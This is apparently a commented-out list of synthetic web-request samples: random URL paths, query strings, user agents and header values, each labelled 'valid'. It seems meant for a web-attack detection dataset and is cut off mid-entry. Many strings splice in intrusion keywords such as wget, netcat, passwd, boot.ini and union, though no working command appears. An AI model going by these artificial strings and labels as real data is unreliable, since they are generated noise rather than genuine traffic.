#  {'pattern': 'eie=e4ee|9rdt>ewexectelnetlio&qdteaqhshoxdpbe=74822935&ilyro=c nae9o&4wzhgrtstmo=ddrop3&szfio=8&usjcg.n=ebtinnsi&srcotyoeoq1or=r6-uosmc1z&ishpls=napiupffpv',
#   'type': 'valid'},
#  {'pattern': 'tz96doi=e3.bgtz@b7a&bfuiocdhbrpl=5.bcwp&ejdldivqq=1881248863&etedjs=9a&ssi7s=ur&zc_94p1x3mc=px4sgc73',
#   'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'mozilla/3.7 (x11; u; linux i586 8.8; ms-nn; rv:5.3.4) gecko/45951631',
#   'type': 'valid'},
#  {'pattern': "hdahtiarhkp2s=aesal&6oshvhiarei=nbivynwc_&rysrg7jaeoa8a=bjtn1tseamtpaslp&hypnqm1=ieyrest1n&tirss=asaprocessing-instruction&a6eg5o1epetldta=pcat'rqea[l'1nt<e r&nmns5b0knkr=0trtelnet&ordeiii=e9drtihacbwuej&arl6cucua=owhere&%ujko=gqbtux39ejw2&sr=48540&q9lnaoidm=nse union98cic&ofrhseajotrlnj=gz9aeaayiframe",
#   'type': 'valid'},
#  {'pattern': '/ixoxdpv9x/kgkcdlt78qvxrwt/tyha/liklezngf4/hkrecmdyp.msf',
#   'type': 'valid'},
#  {'pattern': 'reto-c;q=0.4', 'type': 'valid'},
#  {'pattern': 'shat=nt m\\)poh e', 'type': 'valid'},
#  {'pattern': '*;q=0.4', 'type': 'valid'},
#  {'pattern': 'giiiezh7=$al:hsldlsrig&ss=boot.inidrop', 'type': 'valid'},
#  {'pattern': 'mozilla/2.7 (windows; u; winnt 8.6; ar-g2; rv:6.7.2) gecko/03193712',
#   'type': 'valid'},
#  {'pattern': '/gavum-yz/tg.etqyicvb1ih/xw/betlayt/iskt6ltnejo.html',
#   'type': 'valid'},
#  {'pattern': '/otbpl/anhosfvfi.nj0vk/tchtup5wwir/563xpogqv3j5ckxb/na/wzghhku/oba2xxcgo8c5/yfpsuhaj0hy0d/jiybgsoundvtvm_/i-8vnypiz3rc7thp.jpeg',
#   'type': 'valid'},
#  {'pattern': 'shat=nt m\\)poh e', 'type': 'valid'},
#  {'pattern': '/connect0scriptkxcinu0h0j@bf/8vu2tx7mwe@pxpx7op.css',
#   'type': 'valid'},
#  {'pattern': '/tlkvovhi3azt67efv/ibtettapjrl8smlnode.gif', 'type': 'valid'},
#  {'pattern': 'mozilla/7.3 (machintosh; u; ppc 9.9; ns-to; rv:0.5.9) gecko/89332409',
#   'type': 'valid'},
#  {'pattern': 't4lemi7r-edacdi2;q=0.1, liedj9it-cooerah;q=0.4, mh2mntur-nfyi, viatcnt-hio',
#   'type': 'valid'},
#  {'pattern': '/eenihhlsstethg.cgi', 'type': 'valid'},
#  {'pattern': '/fa0c/nutb0x.asp', 'type': 'valid'},
#  {'pattern': 't4lemi7r-edacdi2;q=0.1, liedj9it-cooerah;q=0.4, mh2mntur-nfyi, viatcnt-hio',
#   'type': 'valid'},
#  {'pattern': 'lzsmae3mtaewr=fta$w icn=oesohb sls;oab6d=mim', 'type': 'valid'},
#  {'pattern': 'dcy@g7.o http://www.thrrf.de', 'type': 'valid'},
#  {'pattern': 'iyeiloa (3gqqyho_; ieskyl@s; dv-y92n; sd0adgsy7p)',
#   'type': 'valid'},
#  {'pattern': 'ethe2o=asn;y0asjep3faf=92338064;eo8eb=3syeeeojudeze1',
#   'type': 'valid'},
#  {'pattern': '*;q=0.1', 'type': 'valid'},
#  {'pattern': 'ter=snph-', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': '/vmigzttnhijt/nt6rrv9e/uic6tigwc/xbk/oon/bsztuylrehne53/nynshdo6nux/tmtcdpt/z2boot.inihttpaw/lec2.jpeg',
#   'type': 'valid'},
#  {'pattern': "txr3tazfha06=o(3r9iusrght'aioeeirg&exuiiislbers8eh=6_h&ni9rlcmethut=oeqosn5en&rdebrihirmgysn=m&hwx5ivt-1j=? nh&f3lsis=01881940&omaea05rnsf=e695oorm",
#   'type': 'valid'},
#  {'pattern': '/enektshtzwprroe/tjnl-at7c6/es_.pvpyzom_s/ab2rbbsmgln-fz9s5a/e3wn/r@8eqleq/access_logx2null2atnf/enpqswklu/qoxph/at1h5i8boariilbod/u8xqnnv/uh.ug.kpisccknn63-..tiff',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': 'ss=998&n92texcirr9t=zduuzqg2a6bs&raniyutopeatca8=64117&rthior1rw=96062&asizp0d=4&zhbztitye0ho=8832010&lje9l7a=47807&er5cq9qtb=3a7eraobt1&doh=s 6tyoslortno3s&eppct=zeeteedoe&q4pufpyna=avrl&oaeantqaazpdi=8310',
#   'type': 'valid'},
#  {'pattern': '/lrst/1a5r/gq9vhe0asm5em/ajy/hfydkl6nqobmv.js', 'type': 'valid'},
#  {'pattern': 'woya=lc1q_ti.la', 'type': 'valid'},
#  {'pattern': '/spbk51v/iicopy-f_4xphpltmailczp/e_qhotdwcn4x3iw257v.css',
#   'type': 'valid'},
#  {'pattern': 'csi9e=732973&u6qmaearty=eh5r0b&qhsphs35iheaeu=775614966&sx@qsxp_nfm85=73817&36xtermjyg8m9uk5=4&shf9fb6wsa=rm-atwn4v&deehh=m2doos&y9ltrnfeurne=95021&achhshirsn=)r nc0formhrhi<c&qfxw-bwxunw=3',
#   'type': 'valid'},
#  {'pattern': '/cnseguo3iiagath/etbcmvgn59zf4m_scsq/n90wak/eum.uegqtt@z0.pl',
#   'type': 'valid'},
#  {'pattern': '/ovin/u4rrbtutamlicnnow9r/hr9teuinfilal7resh/t0vb/xtermjmr/brs8u/dea6e8lehe4itnsovad/nothzqrjg0a3lr/sqrwpc98yeog/2kl/bjk2isyformn.js',
#   'type': 'valid'},
#  {'pattern': 'ey7gesmbou=21306170&h@andzjh=a&oecc2t84sam1dh=in2&ieph=rmu1awaindocumentecho includekvnoa>o&1wqbn6f085o3=692426&nbaertntaq=yui70tifya1ocss&bno=615395&ssa9s4nc=cnh&oqqdilpeg=ozc&sgqy9pd6rm5=otcwuag&lghilienzd9rton=o3tydwoz&eyrnnr9eeuaaron=idibadmini~de&lf)ri%eo:&ozehsgori=ezfsoitale4&veicheatideo=ohoxbman',
#   'type': 'valid'},
#  {'pattern': '/w3/hchatkinf.gif', 'type': 'valid'},
#  {'pattern': 'irse-gnw, ebf-cnarne', 'type': 'valid'},
#  {'pattern': 'mozilla/1.0 (machintosh; u; ppc mac os x 1.1; so-ry; rv:4.9.6) gecko/17805427',
#   'type': 'valid'},
#  {'pattern': '/al/nlnl2/eut/isiaxooxo@h8hax2n/ooo/tm/ij4wmv-/hb/bidxg6ma@md3rsgd.js',
#   'type': 'valid'},
#  {'pattern': '/nu9u_3a_uxg/r22btxypnghsym/hgeszecl36or.shtml',
#   'type': 'valid'},
#  {'pattern': 'neroiod9eto6nit=a8j', 'type': 'valid'},
#  {'pattern': '/uzodmwg0w04eb/tlem/piaitlt0swn/ux3yp7xtermrzl5r/ei2v4yi/eno1i3tuf_cqn583grav/tha1dcuse/ggyb4opt.fpyhomef.jpeg',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'oiddotlxitkoypd=4268941708', 'type': 'valid'},
#  {'pattern': '/osomunode/entagtdierbhoilhneti/iazsovz/ftirn/ttus2a9s.aspx',
#   'type': 'valid'},
#  {'pattern': 'bxyrrayaona=vo&tsieocolrno=xtermto &egv= tiy<]kt ntstodi7i&yqoibncp2tsoh=925&ei=90985&eskgwwget=676258&od9cnt=54738375&nnn=y&l0cugnsre= bcat=s5htoaeta0&mtastajsdn=in&9jj6cmcdmjincludev=:e5flac<p)h&is4neserihaohr=enioe',
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.6 (windows; u; win98 7.0; tr-nw; rv:2.3.3) gecko/57190452',
#   'type': 'valid'},
#  {'pattern': 's8n00l http://www.kgey.com', 'type': 'valid'},
#  {'pattern': '*;q=0.7', 'type': 'valid'},
#  {'pattern': '/te6oaee1euesesluc54r/uk0@vptzochtaccessro/ybfo66__nqf4gjaihk/lnymbviok/oyphnd/xxmlba/tet2ntsn7ahhmee/csi.js',
#   'type': 'valid'},
#  {'pattern': 'zt=coespsssoereattxna&t4cvgherjuloht=697971135&ktnpseh=(szeaseshtreiuafto&edhi5rmtd7=idrozea6',
#   'type': 'valid'},
#  {'pattern': '9emdoeuseisiih=tw3ynmmwldyz&twosnfdriann=933215836&n1gsoth7anylre=43749&7jm8erhgydc=aaus0rc7odrin&libvibw=546hlgemh&zd.nhwcatyw=(kq&weint=691617485&2aes2pt9m=2585&2_crmselecto=upotbtsiaae',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': '/li9.html', 'type': 'valid'},
#  {'pattern': '/txhou9o9/rredokf/cp7lh5d-j0ys7lc@l8/oap/7smy.mdb',
#   'type': 'valid'},
#  {'pattern': '/htdqyevzcylei/fhotioh/h_trd@jseqk9dind./wiihoet9seenr/nea5gasbeeiinyoq/mpaxpprbaiba/iliy9rudaipe/twh.jpg',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'gzip', 'type': 'valid'},
#  {'pattern': 'inntlhgaihfri=6067575&wk1amgcmd=t0sckceetsaoe&vtm6ruye=ay.epug0sb&6zgutie92=4',
#   'type': 'valid'},
#  {'pattern': 'otar2cwsa=41378&betweenpfroma=lsoafe1gilsea&ynak=702349552&6tettittc=6r4osot&irbh0omqhn=liba&chnhts=9507&eee=h5iyiij nr&w2tsinscyndo3it=tjtz7zb&eqngnetsimetc=37&tt2i5eeefsir=37238&v48slittueheeg= a:bp&benc=073116295',
#   'type': 'valid'},
#  {'pattern': '/r@58tukm@msy/s6hq1s/enczilazaeo/obbg7dwixowgetbnestdin/2zluq3k74d2nlfti58m.jpeg',
#   'type': 'valid'},
#  {'pattern': 'alrshh7wttgelkt=tmpl3d7fqdu;nf~olei&swrd2ms=51701296&mz7qukfgmm=r5rtnlgaiaoh&netcat865cy=w2&oontoaou=47612',
#   'type': 'valid'},
#  {'pattern': '/nthbdet/izfb7d/0vmcfjs8aiw6@nposition/erbnrwflias/l1/7rparnoiaaushn6.png',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'ptjzhtaccesqhf=7736442&pcectrp=76&esyd=37e&inec=cre3haeenqove9b&a80ko3s=trcp&hosmea8itbe0ch=mlfbscfogrlsr9ed',
#   'type': 'valid'},
#  {'pattern': '/fzmsn_lgql/dnrvwsqqob/3htaib3ocedofenf/eqqcpqv8/anom6rheleie/d0oqxsamdbperlve_/du73xfxi7eifhnnwzus/axnskp.php4',
#   'type': 'valid'},
#  {'pattern': 'aet=027785&a0gn=o-j7qzcte&hieehazhoci=4&joaudnhne_t=eeomtdas&aienleatpztm=35565&ca=ubxwos@um-be&v0hsztsl=09&iseisia0u6bea=dnaa3na6myf&tsnedh6=02952&nnatheipf=ip9oq',
#   'type': 'valid'},
#  {'pattern': "ogtoik= tr2nr0rb[dlsi p&eformbwgethqp=vkmjsmoi&ek4mee=2ace&ennqippe=5852082&hoe1r3v5pge=teh06g&htiofaxt7te=r&xexec5-8v=atgdy>l&e0mfasdao=070001&bjstylep.nx=' rr&tsnuea=ero3hsa&miqaldwz=tj4x9cjion",
#   'type': 'valid'},
#  {'pattern': '/fqekrncyl4pp3sy/r0dimg.js', 'type': 'valid'},
#  {'pattern': 'zn0-m= is&ai=6981897657&els788drda=fr&vam9ce=7slvbdehh&nd8enhonrtesr=n-l n&i7xx=el6&au=h0r7',
#   'type': 'valid'},
#  {'pattern': 'da5izrnh4x=cul&wtni8snind=mdsthsheaeene&tnwodhyu=o riemaila/rtv&wnaakslo2een=131&odyc8shek40mcn=631&sseiho=regi/&passthrubfqfi=l>anua&l3upedtrile=ked&meysclett=8329269404&vn2ueehh6ksft=rsdsoeee9l&xt=ea~en&ioedotmyet=54',
#   'type': 'valid'},
#  {'pattern': '/boorcc/ur2htew7ircyedoou/rku0don6xuszox3l4drl.exe',
#   'type': 'valid'},
#  {'pattern': '*;q=0.0', 'type': 'valid'},
#  {'pattern': 'leie6v=tjwumeuura7;rgclbingdelete=<y?drop', 'type': 'valid'},
#  {'pattern': '/hrtegsdrim/emqng0kzlxhv.gif', 'type': 'valid'},
#  {'pattern': 'deflate;q=0.4, gzip;q=0.3', 'type': 'valid'},
#  {'pattern': '/haotljeeeh.shtml', 'type': 'valid'},
#  {'pattern': 'd@rmqusr4jxa=05604000;zd1wgetxju_vo=nmochart7y5af%bhoq;lctdy0ie8nc00=odqus.;ptaaym3h2uhni=s',
#   'type': 'valid'},
#  {'pattern': 'mozilla/7.1 (machintosh; u; mac os x 2.8; we-oe; rv:3.7.7) gecko/70280092',
#   'type': 'valid'},
#  {'pattern': '/ip0e8wvbipi/rmh/ah2fnj/awf5mz7qgaaw/rrnbeebvitnbweiimoh/mngksas/ir7whud9x_yao.cz/f4kxq0qduithp-by/tsi2ma0odcfpssrd5ye/4lt0i.sh',
#   'type': 'valid'},
#  {'pattern': '/mvktomu2d_214/h9-k1fis9wfqsil0/bz59_02yl55mtcmj8sw/e_eimhziipjq12x/tqtdlyilienhesiui9/titxe.js',
#   'type': 'valid'},
#  {'pattern': '/tv5xpfx.exe', 'type': 'valid'},
#  {'pattern': '/ntptui/p2ec5q/ttite1tbreltotpatr/lh.css', 'type': 'valid'},
#  {'pattern': '', 'type': 'valid'},
#  {'pattern': 'ieitdeogrl=3175269;mxp_lcugb5ip=rs;eeoi8arer=6;c1log2nsystem=1re',
#   'type': 'valid'},
#  {'pattern': 'saiuinmbedari=fa4yeiipefa&sgieyjtkamy7o=k eix%&.iy-umochadxy=364709&a4tiostvfogaex=43&oktlrsdebdrcke=7933&3tuvoeea=roae&ct5b1veznepxhn=85396929&ttfpaobihnai0o=7144788540&drgc4i1adosi6jo=eeaths4pnt6&ls0eimi=pec&u0rc=1&ialieideget=227',
#   'type': 'valid'},
#  {'pattern': '/wrtpgtjraw5ge/o.s4jpfrui3n55/hs83e5_w_4fguf7ia0/reaanki7odr/oodmoqzlmwdez6w/eqtiunbec/o.be-p_dq/tafebtnndnh1rpitleu/mteahvh/ifmcdulmt_insertsm8.png',
#   'type': 'valid'},
#  {'pattern': '6y=me8npenp&r7l=12860&nda=linm', 'type': 'valid'},
#  {'pattern': 'mozilla/3.0 (windows; u; win 9x 2.3; xy-gl; rv:6.5.9) gecko/22561508',
#   'type': 'valid'},
#  {'pattern': '/phpx/j--pp14/gt2crdihli1lpqs/oufcqph9caxo6d/3terwtocrh/tn.h/aaq2kuz_zxxvwf/0msf/sim3datmin.pl',
#   'type': 'valid'},
#  {'pattern': '/netreeajydooeuar/enroeibse1/glt/t@open6/mxuzyfziycv/-@/0lp-zn0jq00@a3ga/s.vd7md1/hjxalwwaotbtwwme/ldr3..mdb',
#   'type': 'valid'},
#  {'pattern': 'xo1txjw.scriptxe=etwe&aknadec3d4=ae&gpfqio05t6ef=b6eneh&iees=386&ienh=apmemaisj4ermnt&5rtqnusswe=abincsr&ee0=gnxieadi',
#   'type': 'valid'},
#  {'pattern': 'anrbv2npshinsert=r5elocationehqosa&tng=ocxmooehrdsnduau0',
#   'type': 'valid'},
#  {'pattern': 'yftgt/0.8.9', 'type': 'valid'},
#  {'pattern': 'mozilla/4.0 (compatible; msie 9.0; solaris; tenrl)',
#   'type': 'valid'},
#  {'pattern': 'ysqhoriaalxr=paerigt5 s', 'type': 'valid'},
#  {'pattern': 'mozilla/9.1 (compatible; xeitahci; win 9x; cdsisg; nseaetl; 1htieai9d)',
#   'type': 'valid'},
#  {'pattern': 'rkrrfoz=10160&aek6d3zdyketm=ypuo>ayss', 'type': 'valid'},
#  {'pattern': '*;q=0.3', 'type': 'valid'},
#  {'pattern': '*;q=0.8', 'type': 'valid'},
#  {'pattern': '/veee/wh2w.jpeg', 'type': 'valid'},
#  {'pattern': 'swlhnonhf=stcfrn&7tlogasvxpdo=423&@vwyjekrlgmetan=nhs7eo&eccrbt92eobl4t=ccsu',
#   'type': 'valid'},
#  {'pattern': 'l4bneree111drn=6nmsu;bfofya=603429;tmnhtaeowuo3=242185',
#   'type': 'valid'},
#  {'pattern': '/tb4ltyhjtb2s2dn/efyowp_extps@wors.asp', 'type': 'valid'},
#  {'pattern': 'mefirlivpe1ono6', 'type': 'valid'},
#  {'pattern': '/zcf/aano6neieslf8naht/e335c2o0g.cgi', 'type': 'valid'},
#  {'pattern': '/driineaho94reied/to-awoioo@9/ge9r-ohqrwnj69.nocr/ctohl@tt_s.wrx.gif',
#   'type': 'valid'},
#  {'pattern': 'm5eseddydn', 'type': 'valid'},
#  {'pattern': '/sxdeletexsrsh6gyscriptp/iy-pdeqewr/ki4p8evalinputvadmindal/oiaz7ncifsrenowoul/7kformbxvupj/usibrrrscripto/aeneu/1i.dkoxjqmchnpo56q.sh',
#   'type': 'valid'},
#  {'pattern': "hwstet14wy=efjurbsncsist9sj5&onhude=wq&gcer3jjqgi5u9d=fjexf28yz&po8bgsoundg_n=r7n9kr4v62c5&ir=eria'&etscy=2&rhelono2talcl=sslogntdaiqatz e$e&_jiccatbhdrop-=mhpmfdb-9",
#   'type': 'valid'},
#  {'pattern': 'tbtvedr-ah6dh, ll-adioekh;q=0.7, e-bhi7n, eyh1eel-iue;q=0.0, t-br0srree;q=0.6',
#   'type': 'valid'},
#  {'pattern': '*;q=0.4', 'type': 'valid'},
#  {'pattern': '/ddselhiy/d3p/sdfrdtmre/df4adpcswmymh5vv/nph-lxck6.-sjj6oui/epopyv4khfg5ncgmv-/wiereeadahod/ylinna.htm',
#   'type': 'valid'},
#  {'pattern': 'hlvniorseluoe5elllnh', 'type': 'valid'},
#  {'pattern': 'mozilla/0.5 (windows; u; windows nt 6.2; sa-tk; rv:4.4.1) gecko/56324033',
#   'type': 'valid'},
#  {'pattern': 'ohmoa=rori~lra/nns ;rm=42', 'type': 'valid'},
#  {'pattern': '/f08msmiyov9k.asp', 'type': 'valid'},
#  {'pattern': 'uur4em7sismsd=giitrmv1omii9e?&rojsamc@e=462682&daueet=pincludenehtpass (o$t e&zshutdownse$s &itrtinpm=t8',
#   'type': 'valid'},
#  {'pattern': '/eomtjs.tp/huldysedveuvine/oyfaqp-hyk4n.cl/clikrzfhsnmote.shtml',
#   'type': 'valid'},
#  {'pattern': 'ioei9=iee;geigaohpee=ish', 'type': 'valid'},
#  {'pattern': '/ax0/apcealpb0wa87rfet0l/2xyimgx.sy7faecxxu.shtml',
#   'type': 'valid'},
#  {'pattern': '/osahgeaa9aeuea5auian/orkhnnrcto9ppet/petouohb3brsow.shtml',
#   'type': 'valid'},
#  {'pattern': 'aq=eathto\\@mowt&bathk=37382&escriptrx2-d8k=tmpph&rlewh9m=sdfzeaiacmdc0y&htoze3au=orn@&qvycza@zg=eaeahsedpusseeen',
#   'type': 'valid'},
#  {'pattern': '/k3e9hglyh-r3/egpehkvsxblxjnkk3u/rsoiktgjs1ai/91g8ckga6daq4d4_kq9s/90wl7/srgtistdsrnah1/9lfjx3/palc5otrny3tn/@nodetftx.php4',
#   'type': 'valid'},
#  {'pattern': '/uhnihe/st/ekjsrnuexwhr/d1kmkau/ngishekmx@0vqce/6vd0o9ksq2a/xghnrdkgenucqaadi/gq09dr4/tqe-_q45ede/t8ssjhgnhenmilkua/exrsytpincieeem.gif',
#   'type': 'valid'},
#  {'pattern': 'b4am=so]n a9dropeoobject e9&nthlttooe=ufemoqci&eh4include.n-zboot.inietczt=zbsisulwarcyheeis&eawntdxeahygne=0892&t9qn6dh=[ w&neoiweou=resr&etaaefio=srg&2sn7g24h5--=aaip&hrdaa=iee>2i&lnpeposa=87096&iunan6ens=olhfaaaimrh8kl&gts9jutievaenj=noi',
#   'type': 'valid'},
#  {'pattern': '/ovrsufdsrtsseoafr/rxretzosnnt/iznf8@fm9kh/dqd8ev/ieprocessing-instructionp6x_9/bp83ioeosrnttn8kb/tsueu/hebtmwe8bigldb.r.js',
#   'type': 'valid'},
#  {'pattern': '*;q=0.9', 'type': 'valid'},
#  {'pattern': '/mme.sh', 'type': 'valid'},
#  {'pattern': "tnswtaaow=[hia~&ihttsar=eji8r&mfujmffz=1749&tk=x'nntyn/3o on/e&tvsit=2vscowll&vs=lkeyiaf5:oroh87&eti9nel16ryta=ptydcebesr>&beaa7ldceycalah=0b2ri&iiopse=euh&ubrctlsornojecs=o &wc8=0&98gdusmya=ma1ek&qeese9=ttudyeeaqempe&oan3nyitpw=e4j",
#   'type': 'valid'},
#  {'pattern': 'gylm=crk@ochhavingo9nir', 'type': 'valid'},
#  {'pattern': '*;q=0.4', 'type': 'valid'},
#  {'pattern': '/adxwqgx/eemss-.htm', 'type': 'valid'},
#  {'pattern': 'no2-otulho;q=0.0', 'type': 'valid'},
#  {'pattern': '/ecti3um/sqk-qpwvcsqrkm/etbnitpcroduneo/tnltsxaihioedm/cn-jvanxxexw/0io0qh3rheeonh/jfdocument2usrdm2/3yvnrv33xxujp/6xainhtoyuazedd/p-rse-ym66ezq/ryu7p_ml6ol7hvtfs.htm',
#   'type': 'valid'},
#  {'pattern': 'fllctffmz=eo;r&ldo3csl=edpssrahy&bviblataayds=46&moago1vrjf=senrqrelpc0etm&hyxed2epr=8189245&andhap1m=mesytso%u&useyrsdt=kuojl_@g-c.&wriioh=0teo@f]ye0a\\iathbeupdate&cwaedtrtl3=dygu2a&pchildmtnu=7i e&wpgil=dreni&lolaioeaseo=061967',
#   'type': 'valid'},
#  {'pattern': 'erttn5eylrpl=st&rmpmwz6=dn&obu47bsiieemf=mohk&ee=0-zddm&ameiiun65swzr=fni0',
#   'type': 'valid'},
#  {'pattern': 'mozilla/6.9 (compatible; msie 2.3; unix; achlpecsie; lyoies; yya7)',
#   'type': 'valid'},
#  {'pattern': '/izengvuka/hz31m7_q/obdq2tlmmnle9senurdn/udjxe.bin',
#   'type': 'valid'},
#  {'pattern': '/ekoh1qtrbkosis/2dssusvali/hdeoetirte/enodjnuno-5lonad/ae/ae/owepstmmbsmo/bpmm7/reiae98vjzuna/a-knaqklwgz@hk5n-b/y1roj_q1vg77/gktgeu2er1.htm',
#   'type': 'valid'},
#  {'pattern': 'oiohomhyneama=~swyn&co=swibhsreoys0rc&epse=tkxly8&nsfrnjn7tmsaie=oaiar&pehi=rd&vxa=163778&zsock_streamiazaccess_logqformjfei=204&lfjh4_fzrs=6040&8tgynfacnanmi=4991324&r9lwerttyelbmoy=6ihehm6&osoie3enli=anftnnqnhwmur&b1orixegweso=373065&echom50aq=connectel$wnullvaryu0aincludenhltut&odrjem=between\\diae0t1advh',
#   'type': 'valid'},
#  {'pattern': '/n_.58zv7whegixdt/lldpg/r7wu@/frip30js/6fjw86kitu9zcyxy1v/osetmsrnqwet.tiff',
#   'type': 'valid'},
#  {'pattern': 'ocso0=kou&ehuaero6nd=iii&8tesiui=eviy&0ctiaye4y=rfydcl',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'ldrdccttnny=1&siuiiyxseoe=gfdiuotexr6php\\=f&gsaciwic.mcmd=c%t4updateushutdown\\t2-ttiaepe&srsi8dft=niab0imqeee&iylea=thneexeq&elfnkm=eriodjemnc5c0etc&irermoi=fspjt&v6eeeswdir5=953&hbdtecnwth=1356&stt=679&gbkiya6s6stdinv=4&oiclnqtt6tsa9=ftpe&wsbmissio2=8468&zueufaohr7p=iiem1mmhesn1voc&tyfno5i4ai1tent=3',
#   'type': 'valid'},
#  {'pattern': 'la=s5n\\hse&awam5e=titaes:blnkeao&lqe=gnopene&servicesxtermytsa=e?&dsxoajhmp=a(oypasswdcopytaa3eo&3ifo1ss1aal8=81232&5oco1et=2891',
#   'type': 'valid'},
#  {'pattern': 'e6ei-een;q=0.2, e-aeub;q=0.9, c3e-erj, tm8ue-bgdc7wm;q=0.2',
#   'type': 'valid'},
#  {'pattern': 'rstaononseti=287&6eghpfsogrhheji= edt&o8iilsradtls=evalen;v&dzo0g=89&rcid=union/n5upesg&nldbxsdedqnye=stac&nit=0&rlia=ditsso4drhece&pb= 2m4up(3thiscript bawu\\&iorillm=mevmbebgsound6l&vknthr=snom&9ln9nozew=c0g',
#   'type': 'valid'},
#  {'pattern': '/im4ueblre2dephiwq2h/6xosina@ldgr@qradt/fb/rsmf/bwoe6phdeo8enloats/a97vtumuaybtgcdhvgz.html',
#   'type': 'valid'},
#  {'pattern': '/ct6eqhsnodnnhaai/ku9anph-ey.x_/mm.x42oblrwr6/ebvolzgoxkw/uloeig8edegtnabzl/uthgnudiwogdoj6/htleireuw4ne04ze0tr/s7kjj0a/vytetwe1nniu6eo5tiey/e4geslnabioldtd/a1lgd.cfm',
#   'type': 'valid'},
#  {'pattern': '*;q=0.2', 'type': 'valid'},
#  {'pattern': 'compress;q=0.6, identity;q=0.8, identity', 'type': 'valid'},
#  {'pattern': 'smwogrsyaa=ascsq9reler3pnsie&eeftel=806365&aiphntme=r<uinnetcat[v0xcr4e(ue2n=&ijaeths7ijjup=8414&uefeross=edboot.ini2etupdateehrtnl9ecglogin&@wmcunionkallhev=2nbc6exttnntftah&trest=933',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.4 (x11; u; unix 0.4; og-tv; rv:8.1.9) gecko/50977397',
#   'type': 'valid'},
#  {'pattern': '/2u5in@2/nbinkaao9scuhq8/awearcetitnl6ntsuay/v9ymkh3ijtg1/dubnd.hqkdw4enode/ekin97@.6iuguzddfd/xzov_rdopt7sx7r/cybjs/lcte7s4tnekk/rcguy-v/lrdvo/oni7.gif',
#   'type': 'valid'},
#  {'pattern': '/h6aiyjt1@vfxsdaqf9l.png', 'type': 'valid'},
#  {'pattern': '/datlmuaa/sijlm/viyt0abu/de02blpibmnt/l6snv/d5liodthtg0enwdoeds/5is_heikszw7fxdy.l/ikp7swaer0z8atdnyo/rzn85l3qgymrb.png',
#   'type': 'valid'},
#  {'pattern': '/uchild_t/t3z1_dyvlgd@qh/ny.xau3bh46lwpms/diw/usnvda3nlgtlhauxr/ftadfidsp1nmerwug/ty8ay.htm',
#   'type': 'valid'},
#  {'pattern': '/0en/sxymfml-zl2kty87s.y/h8sytbnsrdlhrk4er/hvdhwtdamnwoio/hea3tf61gtdlfxx@/etieqdnio/gstyle0./zr2_mxuo4/cr.png',
#   'type': 'valid'},
#  {'pattern': 'h-80iee', 'type': 'valid'},
#  {'pattern': '/ca1k7a7rsih1nayteree/mtsl0eieirdn9/ksp2nhcia/i3s2oozide/sb3/ajuz48sir7_o.g8/5paosdartainthh7et.shtml',
#   'type': 'valid'},
#  {'pattern': '*', 'type': 'valid'},
#  {'pattern': 'rreneostc5wg= |s;l1http0v6v=r5xub;ntv7ott7s=tju0a',
#   'type': 'valid'},
#  {'pattern': '/6f/cvystttuegniscyuce/axe8/cmakplyhu/bdtignto.jsp',
#   'type': 'valid'},
#  {'pattern': 'boopsg7exbk3p= ;ywx3@aotobg0=@<system3o4irltne;8w=3587;tvimgys=s2lsrzseuto7',
#   'type': 'valid'},
#  {'pattern': 'mozilla/4.3 (x11; u; sunos sun4u 8.2; hf-me; rv:1.8.3) gecko/04692964',
#   'type': 'valid'},
#  {'pattern': 'hn=xmtrkh&elwe=rii&iq2deuwj=qaiyqzieam08h&lseaab5jtoijoow=siu&h6bd.bfselectp96=nnasheo@lceadwh&ebrgpht9nv=nsr&tee6er5om7pexqe=$qb cmn?nursswcetoinclude&updateyostyle=xaaioeaoawdhelts',
#   'type': 'valid'},
#  {'pattern': 'mozilla/5.4 (windows; u; windows nt 1.4; oi-ce; rv:6.3.5) gecko/46788532',
#   'type': 'valid'},
#  {'pattern': 'identity;q=0.7, gzip;q=0.0, gzip;q=0.0', 'type': 'valid'},
#  {'pattern': '/t7ko.shtml', 'type': 'valid'},
#  {'pattern': 'igkshutdown=1rpu&oshurh=256216271', 'type': 'valid'},
#  {'pattern': '/anftatoacar/mbmtasetlude0kct/ekv/qsoscrvnaoadfgpiaen.cgi',
#   'type': 'valid'},
#  {'pattern': 'tfegeowoauf=55q&oiiortva=43&o3=6296&2eauk75drtnit0e=ecoejee$&a8eboh=nfsjshza3daretnalw&bup=6440&hieu=&osjaoirhsa&jh9@mbh8fzdw=it1&hfgno=431574&o2swinntox6u=otnph-ehscript&oilawtrclosn=nnoyea]scriptri&oaesno7c9tcdt=484279&rubea4z=41751787&otulanrprsoht=97542&hsieieonf=etbzoq8q',
#   'type': 'valid'},
#  {'pattern': 'iycesrtpmlmkp=125&monaafydhuq=600&ddtroeeces9np=e&ro3qftn82scai6n=oax&ce=keni&mefadwni=oeu0@dsk0l&obnh4=nieoauohm&n5cyrdomsn0nw=ngnnct5f6jslotm0w&omqeaesojhiua7=2%ne]un cccs&ztarjede9h4safk=ojyodfo&tegee=|\\sa&xsq65=l7oedqj&tmtfeit18mettt=761',
#   'type': 'valid'},
#  {'pattern': '/a0im0l4b4bcen7mkj/eru9ooooetna/astylewobodydad8p/aieyue8fiuncg/ensowtnevxyu/t.v4q3.wydycpicb/tpiysafeeic/icibjzkx/4tlnia82aaitseenh/ehetbeoirt55.mspx',
#   'type': 'valid'},
#  {'pattern': '/rfkittzcd3nm/tkrxblqyp./ivbaccess_logq3uskb@location4/1lob63saoweqine/6kgjhasqam1w/rit/ucob0b5yq0_w/lwax0lbnowqqatmyvlov/emlckyq0novo9ejs2/eolhsanutnn/p_r_q-ja.exe',
#   'type': 'valid'},
#  {'pattern': '/kbaetm/so/0hze5dtvaaten/ai/updatedpynmocharcpi3y/tvlqnquui/unk4fxbd4/5secrn/oqih.asmx',
